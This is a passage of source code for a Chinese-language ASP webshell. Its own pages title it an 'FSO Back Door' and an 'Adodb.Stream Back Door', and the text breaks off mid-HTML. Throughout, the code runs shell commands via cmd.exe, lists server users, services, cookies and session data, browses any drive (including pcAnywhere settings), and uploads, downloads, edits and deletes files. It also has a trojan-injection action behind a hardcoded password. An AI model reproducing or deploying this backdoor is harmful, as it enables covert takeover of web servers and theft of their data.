<%@LANGUAGE="VBSCRIPT" CODEPAGE="936"%>
<object runat="server" id="ws" scope="page" classid="clsid:72C24DD5-D70A-438B-8A42-98424B88AFB8"></object>
<object runat="server" id="ws" scope="page" classid="clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B"></object>
<object runat="server" id="net" scope="page" classid="clsid:093FF999-1EA0-4079-9525-9614C3504B74"></object>
<object runat="server" id="net" scope="page" classid="clsid:F935DC26-1CF0-11D0-ADB9-00C04FD58A0B"></object>
<object runat="server" id="fso" scope="page" classid="clsid:0D43FE01-F093-11CF-8940-00A0C9054228"></object>
<%
rem -------------------
rem    Config模块
rem -------------------
option explicit
dim shellStr,applicationStr,startTime,pageName,url,ServerIP,RootPath,WWWRoot
const m="Coolersky"                          '自定义Session前缀
const userPassword="9kT.(^T/*k*l5v.r"        '自定义登陆口令,需要机密后的.
const clientPassword="l"                     '插入木马的变量名称,如果要插入数据库中,只能为一个字符.
const pageNum="8"                            '自定义id值,也可以是字符
const sqlMaxLoopI=100                        '自定义数据库默认检索数量
const notdownloadsExists=false
const myCmdDotExeFile="cmd.exe"              '自定义cmd shell的名称
const editableFileExt="$log$asp$txt$php$ini$inc$htm$html$xml$conf$config$jsp$java$htt$bat$lst$aspx$php3$php4$js$css$bat$asa$"
shellStr="Shell"
applicationStr="Application"
startTime=timer()
session.timeout=40
pageName=request("pageName")
url=request.serverVariables("url")
ServerIP=Request.ServerVariables("LOCAL_ADDR")
RootPath=Server.MapPath(".")
WWWRoot=Server.MapPath("/")
rem -------------------
rem    Function模块
rem -------------------
function getTheSize(str)
  dim theSize
  theSize=str
  if theSize>=(1024*1024*1024) then getTheSize=fix((theSize/(1024*1024*1024))*10)/10&"G"
  if theSize>=(1024*1024) and theSize<(1024*1024*1024) then getTheSize=fix((theSize/(1024*1024))*10)/10&"M"
  if theSize>=1024 and theSize<(1024*1024) then getTheSize=fix((theSize/1024)*10)/10&"K"
  if theSize>=0 and theSize <1024 then getTheSize=theSize&"B"
end function
function getStrLen(str)
  dim i
  getStrLen=0
  for i=1 to len(str)
    if asc(mid(str,i,1))>0 and asc(mid(str,i,1))<256 then
      getStrLen=getStrLen+1
	else
	  getStrLen=getStrLen+2
	end if
  next
end function
function getCutStr(str,n)
  dim i,j
  if n>len(str) then
    n=len(str)
  end if
  for i=1 to n
    if asc(mid(str,i,1))<=0 or asc(mid(str,i,1))>=256 then
	  j=j+1
	end if
  next
  getCutStr=left(str,n-j)
end function
function getParentFolder(thePath)
  dim path
  path=thePath
  if right(path,1)="\" then
    path=left(path,len(path)-1)
  end if
  if instr(path,"\")>0 then
    getParentFolder=left(path,instrRev(path,"\"))
  else
	getParentFolder=""
  end if
end function
function encodeForUrl(str,flag)
  if flag=true then
	encodeForUrl=replace(str,"\","\\")
	encodeForUrl=replace(encodeForUrl,"'","\'")
	encodeForUrl=replace(encodeForUrl,"\\n","\n")
  else
	encodeForUrl=server.urlEncode(str)
 	encodeForUrl=replace(encodeForUrl,"%5C","\")
  end if
end function
function pathToUrl(str)
  pathToUrl = Server.URLEncode(str)
  pathToUrl = Replace(pathTourl, "%5C", "\")
  pathToUrl = Replace(pathTourl, "%5c", "\")
  pathToUrl = Replace(pathToUrl, "\", "\\")
end function
function fixNull(str)
  if isNull(str) then
    fixNull=""
  else
	fixNull=str
  end if
end function
function getContentType(fileName)
  select case split(fileName,".")(uBound(split(fileName,".")))
	case "asf"
      getContentType="video/x-ms-asf"
	case "avi"
	  getContentType="video/avi"
	case "doc"
	  getContentType="application/msword"
	case "zip"
	  getContentType="application/zip"
	case "xls"
	  getContentType="application/vnd.ms-excel"
	case "gif"
	  getContentType="image/gif"
	case "jpg", "jpeg"
	  getContentType="image/jpeg"
	case "wav"
	  getContentType="audio/wav"
	case "mp3"
	  getContentType="audio/mpeg3"
	case "mpg", "mpeg"
	  getContentType="video/mpeg"
	case "rtf"
	  getContentType="application/rtf"
	case "htm", "html"
	  getContentType="text/html"
	case "txt","js"
	  getContentType="text/plain"
	case else
	  getContentType="application/octet-stream"
  end select
end function
rem ===================
rem      加密函数
rem ===================
function epass(pass)
  dim temppass,templen,mmpassword,j,cool
  temppass=StrReverse(left(pass&"1q2s3c4r5g6n7u8k",16))
  templen=len(pass)
  mmpassword=""
  for j=1 To 16
  cool=int(187*rnd(-asc(mid(temppass,j,1))-templen*asc(right(temppass,1)))+33)
  mmpassword=mmpassword+chr(int(91*rnd(-cool)+32))+chr(asc(mid(temppass,j,1))-templen+int(j*1.1))
  next
  epass=replace(left(mmpassword,8)+right(mmpassword,8),"'","C")
end function
rem ===================
rem  stream读文件函数
rem ===================
function streamReadFromFile(thePath,userCharset)
  dim stream
  set stream=server.createObject("adodb.stream")
  with stream
    .type=2
	.mode=3
	.open
	on error resume next
	.loadFromFile thePath
	chkErr err,err.description
	if userCharset<>"" then
	  .charset=userCharset
	else
	  .charset="gb2312"
	end if
	chkErr err,"编码类型错误!"
	.Position=2
	streamReadFromFile=.readText()
	.close
  end with
  set stream=nothing
end function
rem ===================
rem     cmd运行函数
rem ===================
function doCmdRun(cmdStr)
  on error resume next
  doCmdRun=ws.exec(cmdStr).stdOut.readAll()
  if err then
	err.clear
	ws.run cmdStr&" > "&server.mapPath(".")&"\temp",0,true
	doCmdRun=fso.openTextFile(server.mapPath(".")&"\temp")
	if err then
	  doCmdRun=streamReadFromFile(server.mapPath(".")&"\temp","gb2312")
	end if
  end if
end function
rem ===================
rem    fso搜索函数
rem ===================
function searchFile(f,s,title)
  dim fo,content,pos1,pos2
  set fo=fso.openTextFile(f)
  on error resume next
  content=fo.ReadAll()
  fo.close
  if err then
	err.clear
	content=""
  end if
  searchFile=instr(1,content,S,vbTextCompare)>0 
  if searchFile then
	pos1=instr(1,content,"<TITLE>",vbTextCompare)
	pos2=instr(1,content,"</TITLE>",vbTextCompare)
	title=""
	if pos1>0 and pos2>0 then
	  title=mid(content,pos1+7,pos2-pos1-7)
	end if
  end if
  set fo=nothing
end function
rem ===================
rem   db数据类型函数
rem ===================
function getDataType(typeId)
  select case typeId
	case 130
	  getDataType="文本"
	case 2
	  getDataType="整型"
	case 3
	  getDataType="长整型"
	case 7
	  getDataType="日期/时间"
	case 5
	  getDataType="双精度型"
	case 11
	  getDataType="是/否"
	case 128
	  getDataType="OLE 对象"
	case else
	  getDataType=typeId
  end select
end function
rem -------------------
rem     Sub模块
rem -------------------
sub echo(str)
  response.write(str)
end sub
sub onErr(str)
  echo("&nbsp;出错信息: <font color=red>"&str&"</font>")
  response.end()
end sub
sub redirectTo(url)
  response.redirect(url)
end sub
sub reloadTop()
  echo("<script language=""javascript"">top.location.reload();</script>")
end Sub
sub isIn(flag)
  if session(m&"userPassword")<>userPassword then redirectTo("/")
end sub
sub showTitle(str)
  echo("<title>"&str&"</title>")         '显示每一个栏目的标题
  echo("<title>"&ServerIP&"</title>")    '只在标题显示ip地址
end sub
sub showExecuteTime()
  echo("<br><center>"&((timer-startTime)*1000)&" ms</center>")
end sub
sub chkErr(err,message)
  if err then
	err.clear
	echo("<script language=""javascript"">alert('"&message&"');</script>")
	response.end
  end if
end sub
rem ===================
rem    身份认证模块
rem ===================
sub pageDefault()
  dim id,theAct,password
  id=Trim(Request("id"))
  theAct=request("theAct")
  password=Trim(Request.Form("password"))
  showTitle("管理登录")
  'if password<>"" then response.write Epass(password):response.end   '第一次登陆，取消该行注释获得加密后的口令，然后修改userPassword即可！
  if session(m&"userPassword")<>userPassword Then
    if theAct="chkLogin" then
      if Epass(password)=userPassword then
	    session(m&"userPassword")=userPassword
	    redirectTo(url&"?pageName=server")
	  else
	    redirectTo("/")
	  end if
    else
    'if id<>pageNum then redirectTo("/")    '如果需要id认证,则取消该行注释
      echo("<form action='"&url&"?pageName=default&theAct=chkLogin' method='post'>Pass：<input name='password' type='password' size='15'>&nbsp;<input type='submit' value='Login'></form>")
    end If
    Response.End
  else
  RedirectTo(url&"?pageName=server")
  end If
end sub
rem ===================
rem    系统信息模块
rem ===================
sub pageServer()
  dim i,obj,theAct,theStr,theUser,theOther,theComputer
  isIn(1)
  theAct=request("theAct")
  showTitle("服务器相关数据")
  dim t1,t2,lsabc,theTime
  on error resume next
  theComputer="\\"&net.computerName&"\"&net.userName
  if err then
    err.clear
	echo(err.description)
  end if
  if theAct="showUser" then
    theUser="<a href=""?pageName=server"">【关闭系统用户(组)列表】</a>"
  else
	theUser="<a href=""?pageName=server&theAct=showUser"">【打开系统用户(组)列表】</a>"
  end if
  if theAct="showService" then
	theTime="系统服务列表打开时不执行速度测试"
	theStr="<a href=""?pageName=server"">【关闭系统服务列表】</a>"
  else
	t1=timer()
	for i=1 to 500000
      lsabc=1+1
	next
	  t2=timer()
	  theTime=cstr(int(((t2-t1)*10000)+0.5)/10)&" 毫秒(50万次1+1运算所需时间)"
	  theStr="<a href=""?pageName=server&theAct=showService"">【打开系统服务列表】</a>"
  end if
  if theAct="showOther" then
	theOther="<a href=""?pageName=server"">【关闭其他详细信息】</a>"
  else
	theOther="<a href=""?pageName=server&theAct=showOther"">【打开其他详细信息】</a>"
  end if
%>
<table width=560 border=0 align="center" cellpadding=0 cellspacing=0>
  <tr align="center" class="td" onmouseover="this.className='';" onMouseOut="this.className='td'" height=18> 
    <td height="22" colspan="2" class="td">服务器相关数据</td>
  </tr>
  <tr align="center" class="td" onmouseover="this.className='';" onMouseOut="this.className='td'"> 
    <td height="0" colspan="2" class="trHead">&nbsp;</td>
  </tr>
  <tr class="td" height=18 onmouseover="this.className='';" onMouseOut="this.className='td'"> 
    <td height="22" align=left>&nbsp;服务器名</td>
    <td height="22">&nbsp;<%=request.serverVariables("SERVER_NAME")%></td>
  </tr>
  <tr class="td" height=18 onmouseover="this.className='';" onMouseOut="this.className='td'"> 
    <td height="22" align=left>&nbsp;服务器IP</td>
    <td height="22">&nbsp;<%=request.serverVariables("LOCAL_ADDR")%></td>
  </tr>
  <tr class="td" height=18 onmouseover="this.className='';" onMouseOut="this.className='td'"> 
    <td height="22" align=left>&nbsp;CPU数量</td>
    <td height="22">&nbsp;<%=Request.ServerVariables("NUMBER_OF_PROCESSORS")%></td>
  </tr>
  <tr class="td" height=18 onmouseover="this.className='';" onMouseOut="this.className='td'"> 
    <td height="22" align=left>&nbsp;服务器时间</td>
    <td height="22">&nbsp;<%=now%></td>
  </tr>
  <tr class="td" height=18 onmouseover="this.className='';" onMouseOut="this.className='td'"> 
    <td height="22" align=left>&nbsp;本文件绝对路径</td>
    <td height="22">&nbsp;<%=server.mappath(request.serverVariables("SCRIPT_NAME"))%></td>
  </tr>
  <tr class="td" height=18 onmouseover="this.className='';" onMouseOut="this.className='td'"> 
    <td height="22" align=left>&nbsp;Web根目录</td>
    <td height="22">&nbsp;<%=WWWRoot%></td>
  </tr>
  <tr class="td" height=18 onmouseover="this.className='';" onMouseOut="this.className='td'"> 
    <td height="22" align=left>&nbsp;服务器操作系统</td>
    <td height="22">&nbsp;<%=request.serverVariables("OS")%></td>
  </tr>
  <tr class="td" height=18 onmouseover="this.className='';" onMouseOut="this.className='td'"> 
    <td height="22" align=left>&nbsp;WEB服务器版本</td>
    <td height="22">&nbsp;<%=Request.ServerVariables("SERVER_SOFTWARE")%></td>
  </tr>
  <tr class="td" height=18 onmouseover="this.className='';" onMouseOut="this.className='td'">
    <td height="22" align=left>&nbsp;服务器解译引擎</td>
    <td height="22">&nbsp;<%=ScriptEngine%>/<%=ScriptEngineMajorVersion%>.<%=ScriptEngineMinorVersion%>.<%=ScriptEngineBuildVersion%></td>
  </tr>
  <tr class="td" height=18 onmouseover="this.className='';" onMouseOut="this.className='td'"> 
    <td height="22" align=left>&nbsp;本机局域网地址</td>
    <td height="22">&nbsp;<%=theComputer%></td>
  </tr>
  <tr class="td" height=18 onmouseover="this.className='';" onMouseOut="this.className='td'"> 
    <td height="22" align=left>&nbsp;服务器运算速度测试</td>
    <td height="22" class="warningColor">&nbsp;<%=theTime%></td>
  </tr>
  <tr class="td" height=18 onmouseover="this.className='';" onMouseOut="this.className='td'">
    <td height="22" align=left>&nbsp;系统用户(组)列表</td>
    <td height="22">&nbsp;<%=theUser%></td>
  </tr>
  <tr class="td" height=18 onmouseover="this.className='';" onMouseOut="this.className='td'">
    <td height="22" align=left>&nbsp;服务器系统服务列表</td>
    <td height="22">&nbsp;<%=theStr%></td>
  </tr>
  <tr class="td" height=18 onmouseover="this.className='';" onMouseOut="this.className='td'">
    <td height="22" align=left>&nbsp;其他更多信息</td>
    <td height="22">&nbsp;<%=theOther%></td>
  </tr>
  <tr class="td" height=18 onmouseover="this.className='';" onMouseOut="this.className='td'">
    <td height="22" align=left>&nbsp;组件支持情况</td>
	<form action="?pageName=server&theAct=test" method=post id=form1 name=form1>
	<form method="post">
    <td height="22">
      &nbsp;<input class=input type=text name="theName" size=30>
	  <input type="submit" name="Submit9" value="测试" onClick="if(this.form.theName.value==''){alert('请填写组件名称!');return false;}else{fileEditor.location.href='?pageName=server&theAct=test&theName='+this.form.theName.value;this.disabled=true;}">
	  <input type="button" name="Submit4" value="提示" onClick="alert('1.Scripting.FileSystemObject--文件操作组件\n2.wscript.shell--命令行执行组件\n3.ADOX.Catalog--ACCESS建库组件\n4.JRO.JetEngine--ACCESS压缩组件\n5.Scripting.Dictionary--数据流上传辅助组件\n6.Adodb.connection--数据库连接组件\n7.SoftArtisans.FileUp--SA-FileUp文件上传组件\n8.LyfUpload.UploadFile--刘云峰文件上传组件\n9.Persits.Upload.1--ASPUpload文件上传组件\n10.JMail.SmtpMail--JMail邮件收发组件\n11.CDONTS.NewMail--虚拟SMTP发信组件\n12.SmtpMail.SmtpMail.1--SmtpMail发信组件\n13.Microsoft.XMLHTTP--数据传输组件');">
	</td>
	</form>
  </tr>
<%
  if theAct="showUser" then
    echo("<tr align=center class=td onmouseover=this.className=''; onMouseOut=this.className='td' height=18><td height=22 colspan=2 class=td>服务器系统用户(组)列表</td></tr><tr><td colspan=4 class=trHead>&nbsp;</td></tr>")
	on error resume next
	for each obj in getObject("WinNT://.")
	  if obj.DisplayName="" then
	    echo("<tr class=td><td height=22 colspan=2>&nbsp;"&obj.Name&"</td></tr>")
	  end if	
	next 
  end if
  if theAct="showService" then
    echo("<tr align=center class=td onmouseover=this.className=''; onMouseOut=this.className='td' height=18><td height=22 colspan=2 class=td>系统服务列表</td></tr><tr><td colspan=4 class=trHead>&nbsp;</td></tr>")
	on error resume next
	for each obj in getObject("WinNT://.")
	  if lcase(mid(obj.path,4,3))="win" then
	    echo("<tr><td width=150>&nbsp;<b>"&obj.Name&"</b></td><td>&nbsp;"&obj.DisplayName &"</td></tr><tr><td colspan=2><font color=#008000>&nbsp;&nbsp;&nbsp;&nbsp;"&obj.path&"</font></td></tr>")
	  else
	    echo("<tr><td width=150>&nbsp;<b>"&obj.Name&"</b></td><td>&nbsp;"&obj.DisplayName &"</td></tr><tr><td colspan=2><font color=#FF0000>&nbsp;&nbsp;&nbsp;&nbsp;"&obj.path&"</font></td></tr>")
	  end if
	next
  end if
  if theAct="showOther" then
    dim strVariable,strASPVersion,strCookie,strKey,strSession
	echo("<tr align=center class=td onmouseover=this.className=''; onMouseOut=this.className='td' height=18><td height=22 colspan=2 class=td>Session</td></tr><tr><td colspan=4 class=trHead>&nbsp;</td></tr>")
	echo("<tr><td width=150 valign=top>&nbsp;<b>Session ID</b>&nbsp;</td><td>&nbsp;"&Session.sessionid&"&nbsp;</td></tr>")
	For Each strSession In Session.Contents
	  echo("<tr><td width=150 valign=top>&nbsp;"&strSession&"&nbsp;</td><td>&nbsp;"&Session(strSession)&"&nbsp;</td></tr>")
	Next
      echo("<tr align=center class=td onmouseover=this.className=''; onMouseOut=this.className='td' height=18><td height=22 colspan=2 class=td>Cookies</td></tr><tr><td colspan=4 class=trHead>&nbsp;</td></tr>")
	For Each strCookie In Request.Cookies
	  If Not Request.Cookies(strCookie).HasKeys Then
	    echo("<tr><td width=150 valign=top>&nbsp;"&strCookie&"</td><td>&nbsp;"&Request.Cookies(strCookie)&"&nbsp;</td></tr>")
	  Else
	    For Each strKey In Request.Cookies(strCookie)
	    echo("<tr><td width=150 valign=top>&nbsp"&strCookie&"("&strKey&")</td><td>&nbsp;"&Request.Cookies(strCookie)(strKey) &"&nbsp;</td></tr>")
	    Next
	  End If
	Next
	echo("<tr align=center class=td onmouseover=this.className=''; onMouseOut=this.className='td' height=18><td height=22 colspan=2 class=td>Server Variables</td></tr><tr><td colspan=4 class=trHead>&nbsp;</td></tr>")
	For Each strVariable In Request.ServerVariables
	  echo("<tr><td width=150 valign=top>&nbsp;<b>"&strVariable&"</b></td><td class=""td3"">&nbsp;"&Request.ServerVariables(strVariable)&"&nbsp;</td></tr>")
	Next
  end if
  if theAct="test" then
    echo("<tr align=center class=td onmouseover=this.className=''; onMouseOut=this.className='td' height=18><td height=22 colspan=2 class=td>您指定的组件的检查结果</td></tr><tr><td colspan=4 class=trHead>&nbsp;</td></tr>")
	strClass=trim(request.form("theName"))
    dim strClass,isobj,verobj,testobj
	on error resume next
    IsObj=false
    VerObj=""
    TestObj=""
    set TestObj=server.CreateObject (strClass)
    If -2147221005 <> Err then
      IsObj = True
	  VerObj = TestObj.version
	  if VerObj="" or isnull(VerObj) then VerObj=TestObj.about
    end if
	if not IsObj then 
	  echo("<tr align=center><td valign=top colspan=2><font color=#008000>很遗憾,该服务器不支持"""&strclass&"""组件!</font></td></tr>")
	else
	  echo("<tr align=center><td valign=top colspan=2><font color=red>恭喜!该服务器支持"""&strclass&"组件.")
	  if VerObj="" or isnull(VerObj) then 
	    echo("无法取得该组件版本")
	  else
	    echo("该组件版本是:"&VerObj)
	  end If
	  echo("</font></td></tr>")
	end If
  end if
  echo("</table>")
  showExecuteTime()
end sub
rem ===================
rem    Stream操作模块
rem ===================
sub pageStream()
  isIn(1)
  dim theAct,thePath,toPath,fileName
  theAct=request("theAct")
  toPath=request("toPath")
  thePath=request("thePath")
  fileName=request("fileName")
  if thePath="" then thePath=server.mapPath(".")
  select case theAct
    case "save"
	  streamEditFile(thePath)
	  response.end
	case "down"
	  downTheFile(thePath)
	  response.end
	case "saveAsTwo"
	  saveAsTwo thePath,toPath
	  response.end
  end select
  showTitle("流操作页面")
  pageOther()
  showMenu()
  select case theAct
	case "edit"
	  streamEditFile(thePath)
	  response.end
	case "upload"
	  streamUpload thePath,fileName
	  echo("<script language=""javascript"">location.href='?pageName=stream&thePath="&encodeForUrl(thePath,true)&"';</script>")
	  response.end
  end select
%>
<table width="760" border="0" align="center" cellpadding="0" cellspacing="0">
  <tr> 
    <td height="22" colspan="2" class="td">&nbsp;【<%=request.serverVariables("server_name")%>】Adodb.Stream Back Door</td>
  </tr>
  <tr> 
    <td colspan="2" class="trHead">&nbsp;</td>
  </tr>
  <tr> 
    <td colspan="2" class="td">
	  &nbsp;切换目录:<a href="?pageName=stream&thePath=<%=encodeForUrl(WWWRoot,false)%>">【站点根目录】</a><a href="?pageName=stream&thePath=<%=encodeForUrl(RootPath,false)%>">【本程序目录】</a><a href="?pageName=stream&thePath=C:\">【C:\】</a><a href="?pageName=stream&thePath=D:\">【D:\】</a><a href="?pageName=stream&thePath=E:\">【E:\】</a><a href="?pageName=stream&thePath=F:\">【F:\】</a><a href="?pageName=stream&thePath=C:\Documents%20and%20Settings\">【C:\Docume~1】</a><a href="?pageName=stream&thePath=C:\Program%20Files\">【C:\progra~1】</a><a href="?pageName=stream&thePath=C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere">【Pcanywhere】</a>
	</td>
  </tr>
  <form method="post" onSubmit="this.Submit3.disabled=true;" action="?pageName=stream">
    <tr> 
      <td colspan="2" class="td">&nbsp;查看目录: 
        <input name="thePath" type="text" id="thePath" value="<%=thePath%>" size="60"> 
        <input type="button" name="Submit3" value="查看" onclick="location.href='?pageName=stream&thePath='+this.form.thePath.value;this.disabled=true;">
      </td>
    </tr>
  </form>
  <form method="post" enctype="multipart/form-data" action="?pageName=stream&theAct=upload&thePath=<%=encodeForUrl(thePath,false)%>" onsubmit="return upload_canSubmit(this);">
    <tr> 
      <td colspan="2" class="td">&nbsp;上传文件:
        <input name="file" type="file" size="15"> 保存为 
        <input name="fileName" type="text" value="<%=thePath%>" size="35"> 
		<input name="Submit" type="submit" id="Submit" value="上 传" onClick="this.form.action+='&theFile='+this.form.file.value+'&overWrite='+this.form.writeMode.checked;">
        <input type="checkbox" name="writeMode" value="True">覆盖模式
      </td>
    </tr>
  </form>
  <tr> 
    <td colspan="2" class="trHead">&nbsp;</td>
  </tr>
  <tr> 
    <td width="30%" class="td" valign="top">
      <%call streamGetFolderList(thePath,true)%>
    </td>
    <td width="555" valign="top"> 
      <%call streamGetFolderList(thePath,false)%>
      <br> <div id="loaded" style="display:none;"> 
        <iframe id="fileEditor" frameborder="0" scrolling="no" valign="top" width="100%" height="475"></iframe>
      </div></td>
  </tr>
</table>
<a name="foot"></a>
<%
  showExecuteTime()
end sub
sub streamGetFolderList(thePath,showFolder)
  dim i,sa,ext,flag,list,folders,href,theHref
  set sa=server.createObject(shellStr&"."&applicationStr)
  if len(thePath)=2 then  thePath=thePath&"\"
  set folders=sa.namespace(thePath)
  if showFolder=true and getParentFolder(thePath)<>"" then  echo("&nbsp;<a href=""?pageName=stream&thePath="&encodeForUrl(getParentFolder(thePath),false)&"""><font color=red>↑回上级目录</font></a><br>")
  on error resume next
  for each list in folders.items
  if showFolder=true and list.isfolder Then
    echo("&nbsp;<font class=font-list>└■</font>&nbsp;<a href=""?pageName=stream&thePath="&encodeForUrl(list.path,false)&""">")
    echo(split(list.path, "\")(UBound(split(list.path, "\"))))
    echo("</a><br>")
  else
	if showFolder=false and (not list.isfolder) Then
	  ext=split(list.path,".")(uBound(split(list.path,".")))
	  flag=instr(lcase(editableFileExt),lcase("$"&ext&"$"))
	  if instr(list.path, Server.MapPath("/")) then
		theHref = mid(replace(list.path, server.mapPath("/"),""),2)
		href = ""
		for i = 1 To len(theHref)
		  if Abs(Asc(Mid(theHref, i, 1))) > 255 then
			href = href & Server.URLEncode(Mid(theHref, i, 1))
		  else
			href = href & Mid(theHref, i, 1)
		  end If
		next
		theHref = href
		echo("&nbsp;<font class=font-list>□</font><a href=""/"&theHref&""" target=_blank>"&split(list.path, "\")(UBound(split(list.path, "\")))&"</a>")
	  else
		echo("&nbsp;"&split(list.path, "\")(UBound(split(list.path, "\"))))
	  end if
	  echo("&nbsp;&nbsp;&nbsp;<a href=javascript:; onclick=""stream_downIt('"&pathToUrl(list.path)&"');""><font class=warningColor>Down</font></a>|")
	  if flag>0 then echo("<a href=#foot onclick=""stream_editIt('"&pathToUrl(list.path)&"');""><font class=warningColor>Edit</font></a>|")
	  echo("<a href=javascript:; onclick=""stream_saveAsTwo('"&encodeForUrl(list.path,true)&"','"&pathToUrl(list.path)&"');""><font class=warningColor>SaveAs</font></a>")
	  echo(getTheSize(list.size))
	  echo("<br>")
	end if
  end if
  next
  if err then  onErr err.description
end sub
rem =-=-=-=-=-=-=-=-=-=-=-=
rem    FSO上传调用该模块
rem =-=-=-=-=-=-=-=-=-=-=-=
sub streamUpload(thePath,fileName)
  dim i,j,info,stream,streamT,theFile,overWrite,fileContent
  theFile=request("theFile")
  overWrite=request("overWrite")
  if instr(fileName,":") then
	fileName=fileName
  else
	fileName=thePath&"\"&fileName
  end if
  server.scriptTimeOut=5000
  set stream=server.createObject("adodb.stream")
  set streamT=server.createObject("adodb.stream")
  with stream
	.type=1
	.mode=3
	.open
	.write request.binaryRead(request.totalBytes)
	.position=0
	fileContent=.read()
	i=instrB(fileContent,chrB(13)&chrB(10))
	info=leftB(fileContent,i-1)
	i=len(info)+2
	i=instrB(i,fileContent,chrB(13)&chrB(10)&chrB(13)&chrB(10))+4-1
	j=instrB(i,fileContent,info)-1
	streamT.Type=1
	streamT.Mode=3
	streamT.Open
	stream.position=i
	.copyTo streamT,j-i-2
	on error resume next
	if overWrite="true" then
      streamT.saveToFile fileName,2
	else
	  streamT.saveToFile fileName
	end if
	if err.number=3004 then
	  err.clear
	  fileName=fileName&"\"&split(theFile,"\")(uBound(split(theFile,"\")))
	  if overWrite="true" then
		streamT.saveToFile fileName,2
	  else
		streamT.saveToFile fileName
	  end if
	end if
	chkErr err,err.description&"\n可能同名文件已经存在.');history.back('"
	echo("<script language=""javascript"">alert('文件上传成功!\n"&replace(fileName,"\","\\")&"');</script>")
	streamT.close
	.close
  end with
  set stream=nothing
  set streamT=nothing
end sub	
sub streamEditFile(thePath)
  dim fileName,fileContent,userCharset
  fileName=thePath
  userCharset=request("userCharset")
  if request("theAct")="save" then
    fileContent=request("fileContent")
	streamWriteToFile thePath,fileContent
	response.end
  end if
  fileContent=streamReadFromFile(fileName,request("userCharset"))
%>
<table border="0" align="center" cellpadding="0" cellspacing="0">
  <form method="post" action="?pageName=stream&theAct=save" onsubmit="if(confirm('您确认要保存当前文件吗?')){this.Submit.disabled=true;this.Submit2.disabled=true;this.Submit3.disabled=true;}else{return false;}">
    <tr>
      <td>
	    <input name="thePath" type="text" id="thePath" value="<%=thePath%>" size="50">
        <input type="button" name="Submit6" value="查 看" onclick="location.href='?pageName=stream&theAct=edit&thePath='+this.form.thePath.value;this.disabled=true;">
	  </td>
    </tr>
    <tr> 
      <td><textarea name="fileContent" cols="70" rows="25" id="fileContent"><%=server.htmlEncode(fileContent)%></textarea></td>
    </tr>
    <tr> 
      <td height="50" align="right"><font class="warningColor">非GB2312编码文件可能无法正确保存!</font> 
        <input name="userCharset" type="text" value="<%=userCharset%>" size="10"> 
        <input type="button" value="重新编码" name="Submit3" onclick="location.href='?<%=replace("pageName=stream&thePath="&thePath&"&theAct=edit","\","\\")%>&userCharset='+this.form.userCharset.value;this.disabled=true;"> 
        <input type="button" name="Submit" value="保 存" onClick="if(confirm('确认保存修改?')){this.form.submit();}"> 
        <input type="button" name="Submit2" value="另存为" onclick="stream_saveAs(this.form,'<%=encodeForUrl(thePath,true)%>');"> 
        &nbsp; </td>
    </tr>
  </form>
</table>
<a name="foot"></a>
<%
  showExecuteTime()
end sub
rem =-=-=-=-=-=-=-=-=-=-=-=
rem    FSO下载调用该模块
rem =-=-=-=-=-=-=-=-=-=-=-=
sub downTheFile(thePath)
  dim stream,fileName,fileContentType
  fileName=split(thePath,"\")(uBound(split(thePath,"\")))
  set stream=server.createObject("adodb.stream")
  stream.open
  stream.type=1
  stream.loadFromFile(thePath)
  fileContentType=getContentType(fileName)
  response.addHeader "Content-Disposition", "attachment; filename=" & fileName
  response.addHeader "Content-Length",stream.Size
  response.charset="UTF-8"
  response.contentType=fileContentType
  response.binaryWrite stream.read 
  response.flush
  stream.close
  set stream=nothing
end sub
sub saveAsTwo(thePath,toPath)
  on error resume next
  dim stream
  if lTrim(thePath)=lTrim(toPath) then
	echo("<script>alert('源路径与目标路径相同,操作停止!');</script>")
	response.end
  end if
  set stream=server.createObject("adodb.stream")
  stream.type=1
  stream.open
  stream.loadFromFile thePath
  chkErr err,err.description
  stream.saveToFile toPath,2
  echo("<script language=""javascript"">alert('另存为操作成功!');</script>")
  set stream=nothing
end sub
sub streamWriteToFile(thePath,fileContent)
  dim stream
  set stream=server.createObject("adodb.stream")
  with stream
	.type=2
	.mode=3
	.open
	.charset="gb2312"
	.writeText fileContent
	.saveToFile thePath,2
	.close
  end with
  set stream=nothing
  echo("文件保存成功! [<a href="""&request.serverVariables("http_referer")&""">返回</a>]")
end sub
rem ===================
rem    Fso操作模块
rem ===================
sub pageFso()
  dim key,list,path,theAct,toPath,thePath,driveStr,fileName,fileContent
  isIn(1)
  key=request("key")
  path=request("path")
  theAct=request("theAct")
  toPath=request("toPath")
  thePath=request("thePath")
  fileName=request("fileName")
  fileContent=request("fileContent")
  if thePath="" then thePath=server.mapPath(".")
  if path="" then path=thePath
  showTitle("FSO操作页面")
  select case theAct
	case "inject"
	  fsoInject(thePath)
	  Call reloadTop()
	  response.end
	case "edit"
	  fsoEditFile(thePath)
	  response.end
	case "save"
	  fsoSaveToFile thePath,fileContent
	  Call reloadTop()
	  response.end
	case "delFile"
	  fsoDelFile(thePath)
	  Call reloadTop()
	  response.end
	case "delFolder"
	  fsoDelFolder(thePath)
	  Call reloadTop()
	  response.end
	case "saveAs"
	  fsoSaveAs thePath,toPath
	  Call reloadTop()
	  response.end
	case "createFile"
	  if not fso.fileExists(thePath&"\"&request("theName")) then
		fso.createTextFile thePath&"\"&request("theName")
		chkErr err,err.description
	  end if
	  Call reloadTop()
	  response.end
	case "createFolder"
	  if not fso.folderExists(thePath&"\"&request("theName")) then
		fso.createFolder thePath&"\"&request("theName")
		chkErr err,err.description
	  end if
	  Call reloadTop()
	  response.end
	case "searchFolder"
	  set path=fso.getFolder(path)
	  searchFolder path,key
	  response.end
	case "upload"
	  streamUpload thePath,fileName
	  echo("<script language=""javascript"">location.href='?pageName=fso&thePath="&encodeForUrl(thePath,true)&"';</script>")
  end select
  for each list in fso.drives
	driveStr=driveStr&"【<a href=""?pageName=fso&thePath="&list.driveLetter&":\"">"&list.driveLetter&"盘:</a>】"
  next
%>
<table width="760" border="0" align="center" cellpadding="0" cellspacing="0">
  <tr> 
    <td height="22" colspan="4" class="td">&nbsp;【<%=request.serverVariables("server_name")%>】FSO Back Door</td>
  </tr>
  <tr> 
    <td colspan="4" class="trHead">&nbsp;</td>
  </tr>
  <tr> 
    <td colspan="4" class="td">&nbsp;切换盘符:<%=driveStr%></td>
  </tr>
  <tr> 
    <td colspan="4" class="td">
